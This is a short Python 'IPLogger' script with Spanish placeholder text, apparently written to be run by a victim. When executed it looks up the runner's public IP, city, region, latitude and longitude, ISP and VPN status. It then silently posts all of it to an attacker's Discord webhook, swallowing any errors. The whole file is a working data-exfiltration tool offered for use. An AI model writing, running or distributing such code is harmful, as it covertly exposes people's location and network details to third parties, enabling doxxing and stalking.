import requests

webhook = "CAMBIAR POR EL LINK DE TU WEBHOOK DE DISCORD"

def ip():
  try:
    api = "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query"
    data = requests.get(api).json()
    content = f"**Alguien fue IPloggeado**: \n**IP: {data['query']}**\n**Region: {data['regionName']}**\n**Ciudad: {data['city']}**\n**Latitud: {data['lat']}**\n**Longitud: {data['lon']}**\n**ISP: {data['isp']}**\n**VPN?: {data['proxy']}**"
    requests.post(webhook, json={"avatar_url":"https://i1.sndcdn.com/artworks-VNMgASiDtYR0Xxp9-6Jt3Ng-t500x500.jpg",'username': 'IPLogger - Created by: Euronymou5', 'content': content})
  except:
    pass

ip()
